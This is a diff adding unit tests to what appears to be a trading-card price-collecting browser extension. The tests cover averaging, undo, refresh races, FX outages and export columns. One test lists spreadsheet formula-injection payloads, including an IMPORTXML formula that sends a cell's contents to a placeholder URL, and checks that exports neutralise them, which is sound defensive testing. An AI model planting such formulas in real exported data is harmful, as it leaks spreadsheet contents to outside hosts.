@@ -420,6 +420,360 @@ async function main() {
     console.log("ok  (async) rows sort newest first; clear and remove are undoable");
   }
 
+  // 18 - THE core rule, previously untested: the average is the 5 MOST RECENT sales.
+  // Every earlier fixture had exactly 5 matching rows already in newest-first order, so
+  // deleting the sort or the cap changed nothing and the suite stayed green. This one is
+  // 8 sales in scrambled order with prices chosen so the recent five, the array's first
+  // five, the oldest five and all eight each give a different mean.
+  {
+    const sale = (d, p) => Object.assign({}, MATCHING[0],
+      { orderDate: daysAgo(d), purchasePrice: p });
+    // recent 5 (days 1-5): 30 + 20 + 40 + 60 + 50 = 200 -> 40.00
+    // first 5 in array order:            1 + 20 + 2 + 30 + 50 = 103 -> 20.60
+    // oldest 5 (days 200,90,7,5,4):      3 + 2 + 1 + 50 + 60  = 116 -> 23.20
+    // all 8:                                             206 / 8 -> 25.75
+    const scrambled = [
+      sale(7, 1.00), sale(2, 20.00), sale(90, 2.00), sale(1, 30.00),
+      sale(5, 50.00), sale(3, 40.00), sale(200, 3.00), sale(4, 60.00)
+    ];
+    const row = bg.buildRow(META, SEL, scrambled, FX, NOW);
+
+    assert.strictEqual(row.avg_usd, "40.00",
+      "mean of the 5 MOST RECENT sales, not the first 5 and not all 8");
+    assert.strictEqual(row._samples, 5, "never more than 5 samples, however many matched");
+    assert.strictEqual(row._oldest, daysAgo(5).slice(0, 10),
+      "oldest USED sale is the 5th newest - the day-200 sale is not in the average");
+    assert.strictEqual(row._stale, false,
+      "staleness is judged on the sales actually used, not on the ones dropped");
+    assert.strictEqual(row.cad, (40.00 * 1.3750).toFixed(2));
+
+    // the same 8 in newest-first order must give the identical answer: the result is a
+    // property of the data, not of the order it arrived in
+    const sorted = scrambled.slice()
+      .sort((a, b) => Date.parse(b.orderDate) - Date.parse(a.orderDate));
+    assert.strictEqual(bg.buildRow(META, SEL, sorted, FX, NOW).avg_usd, "40.00");
+    assert.strictEqual(bg.buildRow(META, SEL, scrambled.slice().reverse(), FX, NOW).avg_usd,
+      "40.00");
+
+    // and when the 5 most recent reach past the staleness line, the flag follows them:
+    // 6 sales, the newest 5 ending at day 61
+    const old6 = [sale(61, 10), sale(1, 10), sale(400, 99), sale(3, 10),
+                  sale(2, 10), sale(4, 10)];
+    const oldRow = bg.buildRow(META, SEL, old6, FX, NOW);
+    assert.strictEqual(oldRow._samples, 5);
+    assert.strictEqual(oldRow._oldest, daysAgo(61).slice(0, 10),
+      "the day-400 sale is dropped by the cap; day 61 is the oldest used");
+    assert.strictEqual(oldRow._stale, true);
+    assert.strictEqual(oldRow.avg_usd, "10.00", "the 99.00 outlier is out of the window");
+
+    passed++;
+    console.log("ok  (async) average uses the 5 most recent of 8 unsorted sales");
+  }
+
+  // 19 - undo is surgical. The old undo replaced the whole store with a snapshot, so a
+  // row collected after the delete was silently destroyed by hitting Undo.
+  {
+    chrome.storage.local._d = {};
+    const a = await bg.collect({ productId: "10", sel: SEL, meta: META }, page5);
+    const gone = await bg.handle({ type: "remove", key: a.key });
+    assert.strictEqual(gone.ok, true);
+    assert.deepStrictEqual(gone.keys, [a.key], "remove names exactly what it removed");
+
+    // ...now collect a DIFFERENT card inside the undo window
+    const b = await bg.collect({ productId: "11", sel: SEL, meta: META }, page5);
+    assert.strictEqual((await bg.handle({ type: "count" })).count, 1);
+
+    await bg.handle({ type: "restore", store: gone.prev, keys: gone.keys });
+    const keys = (await bg.handle({ type: "list" })).rows.map(r => r.key).sort();
+    assert.deepStrictEqual(keys, [a.key, b.key].sort(),
+      "undo brings back the deleted row WITHOUT destroying the one collected since");
+
+    // a key that came back on its own is never overwritten by the older snapshot
+    chrome.storage.local._d = {};
+    const c = await bg.collect({ productId: "12", sel: SEL, meta: META }, page5);
+    const gone2 = await bg.handle({ type: "remove", key: c.key });
+    const dearer = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5,
+      totalResults: 5, data: MATCHING.map(r => Object.assign({}, r, { purchasePrice: 99 })) });
+    await bg.collect({ productId: "12", sel: SEL, meta: META }, dearer);
+    const und = await bg.handle({ type: "restore", store: gone2.prev, keys: gone2.keys });
+    assert.strictEqual(und.restored, 0);
+    assert.strictEqual(und.kept, 1, "the re-collected row is left alone");
+    assert.strictEqual((await bg.handle({ type: "list" })).rows[0].avg_usd, "99.00",
+      "undo must not roll a row back to a stale price");
+
+    // clear-all undo is equally surgical
+    chrome.storage.local._d = {};
+    await bg.collect({ productId: "13", sel: SEL, meta: META }, page5);
+    await bg.collect({ productId: "14", sel: SEL, meta: META }, page5);
+    const cleared = await bg.handle({ type: "clear" });
+    const fresh = await bg.collect({ productId: "15", sel: SEL, meta: META }, page5);
+    await bg.handle({ type: "restore", store: cleared.prev, keys: cleared.keys });
+    assert.strictEqual((await bg.handle({ type: "count" })).count, 3,
+      "undoing a clear restores the 2 cleared rows and keeps the 1 collected since");
+    assert.ok((await bg.handle({ type: "list" })).rows.some(r => r.key === fresh.key));
+    passed++;
+    console.log("ok  (async) undo re-inserts only what it removed, never clobbering newer rows");
+  }
+
+  // 20 - refresh during an FX outage must not blank every CAD price in the collection.
+  // There is no undo for a refresh, so a wipe here is permanent.
+  {
+    chrome.storage.local._d = {};
+    const key = "77|Holofoil|Near Mint|English";
+    await bg.handle({ type: "restore", store: { [key]: {
+      name: META.name, set: META.set, number: META.number,
+      printing: "Holofoil", condition: "Near Mint", _language: "English", _url: META.url,
+      avg_usd: "12.70", cad: "17.46", qty: 3, _pct: 55,
+      _fx_rate: "1.3750", _fx_at: "2026-07-20T00:00:00.000Z",
+      _addedAt: "2026-07-20T00:00:00.000Z"
+    } } });
+
+    // FX is down for the whole suite (global.fetch throws), prices moved to 20.00
+    const dearer = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 5,
+      totalResults: 5, data: MATCHING.map(r => Object.assign({}, r, { purchasePrice: 20 })) });
+    const res = await bg.handle({ type: "refreshAll" }, dearer);
+
+    const row = (await bg.handle({ type: "list" })).rows[0];
+    assert.strictEqual(row.avg_usd, "20.00", "the USD side still refreshes");
+    assert.notStrictEqual(row.cad, "", "CAD is NOT blanked by an exchange-rate outage");
+    assert.strictEqual(row._fx_rate, "1.3750", "the last known rate is kept");
+    assert.strictEqual(row._fx_at, "2026-07-20T00:00:00.000Z",
+      "and keeps its original timestamp, so the drawer can show how old it is");
+    assert.strictEqual(row.cad, (20 * 1.3750).toFixed(2),
+      "re-priced at the kept rate, so cad = avg_usd * _fx_rate still holds");
+    assert.strictEqual(row._fx_stale, true);
+    assert.strictEqual(row.qty, 3, "qty untouched");
+    assert.strictEqual(row._pct, 55, "per-row % untouched");
+
+    assert.strictEqual(res.fxFailed, 1, "the outage is counted");
+    assert.strictEqual(res.partial, true, "and reported as a partial refresh, not a success");
+    passed++;
+    console.log("ok  (async) FX outage during refresh preserves CAD and reports partial");
+  }
+
+  // 21 - a row deleted while the refresh is paging must stay deleted. The key list comes
+  // from a read taken outside the mutation queue, so it goes stale the moment you delete.
+  {
+    chrome.storage.local._d = {};
+    const a = await bg.collect({ productId: "20", sel: SEL, meta: META }, page5);
+    const b = await bg.collect({ productId: "21", sel: SEL, meta: META }, page5);
+    await bg.handle({ type: "setQty", key: b.key, qty: "9" });
+    await bg.handle({ type: "setPct", key: b.key, pct: "45" });
+
+    let deleted = false;
+    const res = await bg.handle({ type: "refreshAll" }, async () => {
+      // delete the OTHER row mid-refresh, exactly as a click in the drawer would
+      if (!deleted) { deleted = true; await bg.handle({ type: "remove", key: b.key }); }
+      return { previousPage: "", nextPage: "", resultCount: 5, totalResults: 5,
+               data: MATCHING };
+    });
+
+    const rows = (await bg.handle({ type: "list" })).rows;
+    assert.strictEqual(rows.length, 1, "the deleted row is NOT resurrected by the refresh");
+    assert.strictEqual(rows[0].key, a.key);
+    assert.strictEqual(res.skipped, 1, "the skip is reported");
+    assert.strictEqual(res.refreshed, 1);
+    assert.strictEqual(res.failed, 0, "a deliberate delete is not a failure");
+    passed++;
+    console.log("ok  (async) refresh skips rows deleted while it was running");
+  }
+
+  // 22 - double-clicking the trash used to return ok twice, and the second toast (whose
+  // snapshot no longer held the row) replaced the only undo that could restore it.
+  {
+    chrome.storage.local._d = {};
+    const a = await bg.collect({ productId: "30", sel: SEL, meta: META }, page5);
+    const first = await bg.handle({ type: "remove", key: a.key });
+    const second = await bg.handle({ type: "remove", key: a.key });
+
+    assert.strictEqual(first.ok, true);
+    assert.strictEqual(second.ok, false, "removing an absent key is not a success");
+    assert.strictEqual(second.prev, undefined,
+      "and carries no snapshot that could replace the live undo");
+
+    // the first response is still a working undo
+    await bg.handle({ type: "restore", store: first.prev, keys: first.keys });
+    assert.strictEqual((await bg.handle({ type: "count" })).count, 1,
+      "the row is still recoverable after the second click");
+    passed++;
+    console.log("ok  (async) a second delete of the same row is a no-op, undo survives");
+  }
+
+  // 23 - a card name is attacker-supplied text from a marketplace listing. Leading
+  // = + - @ makes it a live formula in Sheets/Excel, on BOTH export paths.
+  {
+    const evil = [
+      "=IMPORTXML(CONCAT(\"//x?\",A1),\"//a\")",
+      "+1+1",
+      "-2+3",
+      "@SUM(1,2)",
+      "=1+1,with a comma"
+    ];
+    for (const name of evil) {
+      const row = Object.assign(bg.buildRow(META, SEL, MATCHING, FX, NOW), { name });
+      const csvLine = bg.toDelimited([row], ",").split("\r\n")[1];
+      const tsvLine = bg.toDelimited([row], "\t").split("\r\n")[1];
+      const csvFirst = csvLine[0] === '"' ? csvLine.slice(1) : csvLine;
+      assert.strictEqual(csvFirst[0], "'", `CSV must neutralise ${name}`);
+      assert.strictEqual(tsvLine[0], "'", `TSV must neutralise ${name}`);
+      // the text itself is still there, just inert (quotes doubled per RFC 4180)
+      assert.ok(csvLine.includes(name.replace(/"/g, '""').split(",")[0]),
+        `text preserved for ${name}`);
+    }
+    // ordinary names are untouched
+    const plain = bg.buildRow(META, SEL, MATCHING, FX, NOW);
+    assert.ok(bg.toDelimited([plain], ",").split("\r\n")[1].startsWith("Charizard"));
+    assert.ok(!bg.toDelimited([plain], "\t").includes("'"));
+    // a tab or newline inside a name cannot split the TSV row
+    const messy = Object.assign({}, plain, { name: "a\tb\nc" });
+    assert.strictEqual(bg.toDelimited([messy], "\t").split("\r\n").length, 2);
+    assert.strictEqual(bg.toDelimited([messy], "\t").split("\r\n")[1].split("\t").length,
+      bg.COLUMNS.length);
+    passed++;
+    console.log("ok  (async) formula injection neutralised on the CSV and clipboard paths");
+  }
+
+  // 24 - the API's field types are not a promise. A null price must never become 0.00 and
+  // a malformed date must never throw a RangeError at the user.
+  {
+    const bad = (over) => Object.assign({}, MATCHING[0], over);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: null })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: undefined })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: "" })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: "n/a" })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: NaN })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ orderDate: "not a date" })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ orderDate: null })), false);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: 12.5 })), true);
+    assert.strictEqual(bg.isUsableSale(bad({ purchasePrice: "12.50" })), true,
+      "a numeric string is read, but nothing else is");
+
+    // bad rows are dropped from the average rather than poisoning it
+    const mixed = [bad({ purchasePrice: 10, orderDate: daysAgo(1) }),
+                   bad({ purchasePrice: null, orderDate: daysAgo(2) }),
+                   bad({ purchasePrice: 20, orderDate: daysAgo(3) }),
+                   bad({ purchasePrice: 999, orderDate: "yesterday-ish" })];
+    const row = bg.buildRow(META, SEL, mixed, FX, NOW);
+    assert.strictEqual(row.avg_usd, "15.00", "mean of the two readable sales only");
+    assert.strictEqual(row._samples, 2);
+    assert.ok(!row.avg_usd.includes("NaN"));
+
+    // a malformed date raises a clear message, not a raw RangeError
+    assert.throws(() => bg.buildRow(META, SEL, [bad({ orderDate: "garbage" })], FX, NOW),
+      /readable purchase price and order date/);
+    assert.throws(() => bg.buildRow(META, SEL, [bad({ purchasePrice: null })], FX, NOW),
+      /readable purchase price and order date/);
+
+    // and the collect path turns that into a refusal, not a stored 0.00 row
+    chrome.storage.local._d = {};
+    const junk = () => Promise.resolve({ previousPage: "", nextPage: "", resultCount: 2,
+      totalResults: 2, data: [bad({ purchasePrice: null }), bad({ orderDate: "nope" })] });
+    const res = await bg.collect({ productId: "40", sel: SEL, meta: META }, junk);
+    assert.strictEqual(res.ok, false);
+    assert.ok(/unreadable/.test(res.error), "the message says what was wrong: " + res.error);
+    assert.strictEqual((await bg.handle({ type: "count" })).count, 0,
+      "nothing plausible-looking is stored");
+
+    // the counts distinguish "wrong printing" from "unreadable"
+    const counted = await bg.collectSales("1", SEL, () => Promise.resolve({
+      previousPage: "", nextPage: "", resultCount: 3, totalResults: 3,
+      data: [withPhotos, bad({ purchasePrice: null }), MATCHING[0]] }));
+    assert.strictEqual(counted.rejected, 1);
+    assert.strictEqual(counted.invalid, 1);
+    assert.strictEqual(counted.matched.length, 1);
+    passed++;
+    console.log("ok  (async) malformed purchasePrice / orderDate rejected with a clear message");
+  }
+
+  // 25 - the export carries the trade-in percent. Without it you hand a counter a sheet
+  // of MARKET prices and quote market, which is the entire margin gone.
+  {
+    chrome.storage.local._d = {};
+    const key = "88|Holofoil|Near Mint|English";
+    await bg.handle({ type: "restore", store: { [key]: {
+      name: "Pikachu", set: "Base", number: "58/102", printing: "Holofoil",
+      condition: "Near Mint", _language: "English", avg_usd: "10.00", cad: "20.00",
+      qty: 3, _addedAt: "2026-07-20T00:00:00.000Z", _fx_rate: "2.0000"
+    } } });
+    await bg.handle({ type: "setGlobalPct", pct: "60" });
+
+    const copy = await bg.handle({ type: "copyText" });
+    const [head, line] = copy.text.split("\r\n");
+    assert.deepStrictEqual(head.split("\t"), bg.EXPORT_COLUMNS);
+    assert.deepStrictEqual(bg.EXPORT_COLUMNS.slice(-3), ["pct", "trade_cad", "trade_total"]);
+    const cell = c => line.split("\t")[bg.EXPORT_COLUMNS.indexOf(c)];
+    assert.strictEqual(cell("cad"), "20.00", "market price is still there, unambiguously");
+    assert.strictEqual(cell("pct"), "60");
+    assert.strictEqual(cell("trade_cad"), "12.00", "20.00 at 60%");
+    assert.strictEqual(cell("trade_total"), "36.00", "and times the 3 copies");
+
+    // a per-row override beats the house rate in the export too
+    await bg.handle({ type: "setPct", key, pct: "25" });
+    const line2 = (await bg.handle({ type: "copyText" })).text.split("\r\n")[1];
+    assert.strictEqual(line2.split("\t")[bg.EXPORT_COLUMNS.indexOf("trade_cad")], "5.00");
+
+    // a global 0% means 0, exactly as a per-row 0% already did
+    await bg.handle({ type: "setPct", key, pct: "" });
+    assert.strictEqual((await bg.handle({ type: "setGlobalPct", pct: "0" })).pct, 0,
+      "0% is a real house rate, not a missing one");
+    const line3 = (await bg.handle({ type: "copyText" })).text.split("\r\n")[1];
+    assert.strictEqual(line3.split("\t")[bg.EXPORT_COLUMNS.indexOf("trade_cad")], "0.00");
+    await bg.handle({ type: "setGlobalPct", pct: "100" });
+
+    // no rate: the trade columns are EMPTY, never a 0 that reads like a real price
+    const noFx = bg.withTrade([{ cad: "", qty: 2 }], 60)[0];
+    assert.strictEqual(noFx.trade_cad, "");
+    assert.strictEqual(noFx.trade_total, "");
+    passed++;
+    console.log("ok  (async) export carries pct, trade_cad and trade_total alongside market cad");
+  }
+
+  // 26 - a refresh is not a touch: re-stamping _addedAt reshuffled the drawer out of the
+  // order the user built it in.
+  {
+    chrome.storage.local._d = {};
+    const a = await bg.collect({ productId: "50", sel: SEL, meta: META }, page5);
+    await new Promise(r => setTimeout(r, 5));
+    const b = await bg.collect({ productId: "51", sel: SEL, meta: META }, page5);
+    const before = (await bg.handle({ type: "list" })).rows.map(r => r.key);
+    assert.deepStrictEqual(before, [b.key, a.key], "newest first");
+
+    const stamps = {};
+    for (const r of (await bg.handle({ type: "list" })).rows) stamps[r.key] = r._addedAt;
+
+    await bg.handle({ type: "refreshAll" }, page5);
+    const after = (await bg.handle({ type: "list" })).rows;
+    assert.deepStrictEqual(after.map(r => r.key), before, "refresh preserves drawer order");
+    for (const r of after) {
+      assert.strictEqual(r._addedAt, stamps[r.key], "refresh does not re-stamp _addedAt");
+    }
+
+    // adding a copy IS a touch, and floats the row back to the top
+    await bg.collect({ productId: "50", sel: SEL, meta: META, mode: "bump" }, page5);
+    assert.strictEqual((await bg.handle({ type: "list" })).rows[0].key, a.key);
+    passed++;
+    console.log("ok  (async) refresh keeps drawer order; adding a copy floats the row up");
+  }
+
+  // 27 - "few sales" is not "signed out". The old test flagged any product with 5 or
+  // fewer sales, hard-blocking the panel with a wrong explanation.
+  {
+    const page = (total, n, next) => ({
+      totalResults: total, nextPage: next || "",
+      data: Array.from({ length: n }, () => MATCHING[0])
+    });
+    assert.strictEqual(bg.looksLoggedOut(page(5, 5)), true,
+      "exactly 5, a full page, no next page: the truncation signature");
+    assert.strictEqual(bg.looksLoggedOut(page(3, 3)), false,
+      "a genuinely quiet product is not a signed-out session");
+    assert.strictEqual(bg.looksLoggedOut(page(1, 1)), false);
+    assert.strictEqual(bg.looksLoggedOut(page(0, 0)), false);
+    assert.strictEqual(bg.looksLoggedOut(page(5, 5, "Yes")), false, "paging works: signed in");
+    assert.strictEqual(bg.looksLoggedOut(page(120, 25, "Yes")), false);
+    passed++;
+    console.log("ok  (async) looksLoggedOut tells truncation apart from a quiet product");
+  }
+
   console.log(`\n${passed} assertion groups passed`);
 }
 
